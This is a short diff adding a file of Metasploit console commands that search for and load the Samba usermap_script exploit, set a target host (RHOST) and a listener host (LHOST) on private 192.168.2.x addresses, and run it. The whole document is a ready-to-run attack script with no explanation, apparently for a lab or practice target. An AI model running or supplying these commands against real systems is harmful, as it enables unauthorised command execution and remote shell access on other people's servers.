@@ -1,0 +1,9 @@
+search samba
+use 8
+
+use exploit/multi/samba/usermap_script
+
+set RHOST 192.168.2.3
+set LHOST 192.168.2.4
+
+run
